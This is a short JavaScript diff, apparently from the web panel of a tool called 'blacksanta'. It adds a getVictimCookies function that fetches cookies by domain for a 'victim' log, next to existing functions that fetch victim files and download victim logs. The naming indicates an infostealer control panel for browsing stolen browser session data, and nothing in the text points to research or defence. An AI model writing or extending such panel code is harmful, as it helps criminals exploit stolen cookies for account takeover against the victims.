@@ -646,6 +646,15 @@ const getVictimFile = async (logId, fileId) => {
   return data;
 };
 
+const getVictimCookies = async (logId, domain) => {
+  const response = await fetch(`/api/blacksanta/victims/${logId}/cookies/${encodeURIComponent(domain)}`);
+  const data = await response.json();
+  if (!response.ok) {
+    throw new Error(data?.error || 'Erreur de récupération des cookies');
+  }
+  return data;
+};
+
 const downloadVictimLog = async (logId) => {
   const response = await fetch(`/api/blacksanta/victims/${logId}/download`);
   if (!response.ok) {
